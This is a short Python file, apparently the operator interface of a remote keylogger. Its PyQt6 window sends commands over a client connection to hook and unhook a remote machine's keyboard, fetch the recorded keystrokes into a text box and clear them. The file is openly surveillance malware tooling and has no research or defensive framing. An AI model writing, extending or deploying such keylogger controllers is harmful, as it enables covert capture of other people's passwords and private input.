from keylog_designer import KeyloggerDesign
import glob_var as gv
import utils
from PyQt6.QtWidgets import QApplication
import sys


class KeyloggerApp(KeyloggerDesign):
    def __init__(self):
        super().__init__()

    def onButtonHookClick(self):
        utils.write(gv.client, "keylogHook()")

    def onButtonUnhookClick(self):
        utils.write(gv.client, "keylogUnhook()")

    def onButtonPrintKeyClick(self):
        utils.write(gv.client, "keylogPrint()")

        self.txtOutput.setText(utils.read_str(gv.client))

    def onButtonClearClick(self):
        utils.write(gv.client, "keylogClear()")

        self.txtOutput.setText("")

    def closeEvent(self, event):
        self.onButtonUnhookClick()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    keylogger_app = KeyloggerApp()
    keylogger_app.show()
    sys.exit(app.exec())
